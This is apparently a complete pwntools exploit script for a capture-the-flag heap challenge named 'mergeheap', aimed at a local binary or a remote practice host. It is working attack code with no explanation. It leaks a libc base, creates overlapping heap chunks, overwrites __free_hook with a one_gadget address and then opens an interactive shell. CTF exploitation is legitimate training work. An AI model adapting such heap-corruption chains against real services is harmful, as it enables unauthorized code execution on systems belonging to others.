#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./mergeheap')
	elf = ELF('./mergeheap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)
else:
	p = remote('node3.buuoj.cn',26817)
	elf = ELF('./mergeheap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)


def menu(cmd):
    sla(">>",str(cmd))

def add(size,content):
    menu(1)
    sla("len:",str(size))
    sla("content:",content)

def show(idx):
    menu(2)
    sla("idx:",str(idx))

def delete(idx):
    menu(3)
    sla("idx:",str(idx))

def merge(idx1,idx2):
    menu(4)
    sla("idx1:",str(idx1))
    sla("idx2:",str(idx2))

###leak libc###
for i in range(8):
    add(0x80,'T'*0x80)#0-7

delete(7)

for i in range(7):
    delete(i)#0-6

for i in range(7):
    add(0x80,'AAAAAAA')#0-6

add(0x8,'BBBBBBBB')#7

show(7)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 224 - 0x3ebc40
success(hex(libc_base))

for i in range(8):
    delete(i)


###overlapping###
one_gadget = libc_base + 0x4f322
free_hook = libc_base + libc.symbols['__free_hook']


add(0x60,'clear unsorted bin')#0 left unsorted bin

add(0x30,'A'*0x30)#2
add(0x38,'B'*0x38)#3
add(0x100,'C'*0x20)#4
add(0x68,'D'*0x68)#5
add(0x20,'E'*0x20)#6
add(0x20,'F'*0x20)#7
add(0x20,'G'*0x20)#8
add(0x20,'H'*0x20)#9

delete(4)
delete(6)

merge(1,2)
delete(5)


payload = 'A' * 0x20 + p64(0) + p64(0x100) + p64(free_hook)
add(0x100,payload)

add(0x20,'Go')
add(0x20,p64(one_gadget))

#gdb.attach(p)

###get shell###
delete(1)
ia()